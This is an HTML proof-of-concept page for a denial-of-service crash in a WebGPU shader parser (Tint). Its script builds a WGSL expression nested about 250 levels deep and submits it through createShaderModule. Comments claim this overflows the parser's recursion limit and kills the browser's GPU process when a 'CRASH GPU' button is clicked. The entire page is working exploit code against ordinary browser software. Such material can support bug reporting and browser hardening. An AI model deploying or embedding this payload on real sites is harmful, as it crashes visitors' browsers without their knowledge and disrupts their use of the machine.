<!DOCTYPE html>
<html>
<head>
    <title>WebGPU Tint Parser DoS</title>
</head>
<body>
    <h2>Tint AST Recursive Depth DoS</h2>
    <p>Clicking the button will crash the GPU Process.</p>
    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white;">CRASH GPU</button>

    <script>
        // Generate the exact depth needed to trigger the AST state corruption
        function generateKillerMath(depth) {
            if (depth <= 0) return "(1.0)";
            return `(${generateKillerMath(depth - 1)} * vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
        }

        async function triggerCrash() {
            if (!navigator.gpu) {
                alert("WebGPU is not supported.");
                return;
            }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();

            // We generate roughly 250 nested operations.
            // This is enough to hit the "maximum parser recursive depth reached" 
            // and trigger the SIGTRAP in CrGpuMain.
            const killerWGSL = `
                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
                    let crazy_var = ${generateKillerMath(250)};
                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
                }
            `;

            console.log("Sending payload to Tint...");
            
            try {
                // This call crashes the GPU Process
                device.createShaderModule({ code: killerWGSL });
            } catch (e) {
                console.log("Caught:", e);
            }
        }

        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
    </script>
</body>
</html>
